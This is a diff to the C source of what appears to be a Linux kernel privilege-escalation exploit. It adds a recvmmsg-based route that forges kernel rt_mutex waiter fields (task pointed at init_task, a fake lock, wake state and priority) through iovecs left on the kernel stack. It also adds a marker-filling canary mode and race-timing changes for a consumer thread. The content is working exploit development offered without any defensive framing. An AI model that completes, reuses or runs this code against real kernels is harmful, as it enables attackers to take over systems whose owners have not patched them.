@@ -1,6 +1,8 @@
 #include "common.h"
 #include "runtime_offsets.h"
 #include <time.h>
+#include <sys/socket.h>
+#include <asm/unistd.h>
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
   clock_gettime(CLOCK_MONOTONIC, &now);
@@ -49,6 +51,12 @@ static int route_delay_usec(int attempt) {
   if (override >= 0) {
     return override;
   }
+
+  /* delay=0 for custom write: consumer fires BEFORE select enters kernel,
+   * PI walk uses the REAL waiter data (valid task/lock from futex).
+   * This is how 6.12 works — the fd_set overlay is never actually read. */
+  if (pselect_custom_write_enabled())
+    return 0;
 
   static const int delays[] = {
     50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
@@ -135,6 +143,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(out);
   FD_ZERO(ex);
 
+  if (env_flag("PSELECT_CANARY", 0)) {
+    pr_info("CANARY MODE: filling fd_set with marker values\n");
+    for (int w = 0; w < 5; w++) {
+      fdset_put_word(in,  w, 0xAAAA000000000000ULL | ((uint64_t)(w)      << 32) | 0x10);
+      fdset_put_word(out, w, 0xAAAA000000000000ULL | ((uint64_t)(w + 5)  << 32) | 0x10);
+      fdset_put_word(ex,  w, 0xAAAA000000000000ULL | ((uint64_t)(w + 10) << 32) | 0x10);
+    }
+    return;
+  }
+
   if (env_flag("PSELECT_SIMPLE_LAYOUT", 0)) {
     fdset_put_word(in, 0, fake_w0);
     fdset_put_word(in, 3, 0);
@@ -175,7 +193,82 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   }
 }
 
+void do_recvmmsg_fake_lock_route(void) {
+  if (!page_base || !fake_lock) {
+    if (!env_flag("PSELECT_CANARY", 0)) {
+      pr_error("recvmmsg route: missing page base=%016zx lock=%016zx\n", page_base, fake_lock);
+      return;
+    }
+    page_base = 0xDEAD000000000000ULL;
+    fake_lock = 0xDEAD000000000000ULL;
+    fake_w0 = 0xDEAD000000000000ULL;
+  }
+
+  int sv[2];
+  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
+    pr_error("recvmmsg: socketpair failed errno=%d\n", errno);
+    return;
+  }
+
+  /* iovec layout maps to waiter fields at offsets 0x28-0x50:
+   * iovec[0].iov_base → pi_tree.rb_left (0x28)
+   * iovec[0].iov_len  → task (0x30) = init_task
+   * iovec[1].iov_base → lock (0x38) = fake_lock
+   * iovec[1].iov_len  → wake_state(3) + prio(1) packed (0x40)
+   * iovec[2].iov_base → deadline (0x48) = 0
+   * iovec[2].iov_len  → ww_ctx (0x50) = 0 */
+  struct iovec iov[3] = {
+    { .iov_base = NULL,
+      .iov_len  = (size_t)text_addr(INIT_TASK) },
+    { .iov_base = (void *)fake_lock,
+      .iov_len  = 3 | (1ULL << 32) },   /* wake_state=3, prio=1 */
+    { .iov_base = NULL,
+      .iov_len  = 0 },
+  };
+
+  struct mmsghdr mmsg;
+  memset(&mmsg, 0, sizeof(mmsg));
+  mmsg.msg_hdr.msg_iov = iov;
+  mmsg.msg_hdr.msg_iovlen = 3;
+
+  pr_info("recvmmsg route: task=%016zx lock=%016zx wake_prio=%016zx\n",
+          (size_t)iov[0].iov_len, (size_t)iov[1].iov_base, (size_t)iov[1].iov_len);
+
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0);
+  int delay_usec = 50000;
+  atomic_store(&main_route_delay_usec, delay_usec);
+  atomic_store(&punch_consume_go, 1);
+
+  pr_info("recvmmsg pre-recvmmsg delay=%d\n", delay_usec);
+  errno = 0;
+
+  /* This blocks until data arrives on sv[0] — iovecs stay on kernel stack.
+   * Use timeout=NULL for infinite block, consumer will unblock by writing. */
+  pr_info("recvmmsg: sv[0]=%d sv[1]=%d iovlen=%d\n", sv[0], sv[1], (int)mmsg.msg_hdr.msg_iovlen);
+  int ret = syscall(__NR_recvmmsg, sv[0], &mmsg, 1, 0, NULL);
+  int saved_errno = errno;
+
+  pr_info("recvmmsg post-recvmmsg ret=%d errno=%d\n", ret, saved_errno);
+  atomic_store(&punch_consume_go, 0);
+
+  int calls = atomic_load(&consumer_calls);
+  int success = atomic_load(&consumer_success);
+  pr_info("recvmmsg result: calls=%d success=%d\n", calls, success);
+
+  close(sv[0]);
+  close(sv[1]);
+}
+
 void do_pselect_fake_lock_route(void) {
+  if (env_flag("PSELECT_CANARY", 0) && !page_base) {
+    page_base = 0xDEAD000000000000ULL;
+    fake_lock = 0xDEAD000000000000ULL;
+    fake_fops = 0xDEAD000000000000ULL;
+    fake_w0 = 0xDEAD000000000000ULL;
+    fake_task = 0xDEAD000000000000ULL;
+  }
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
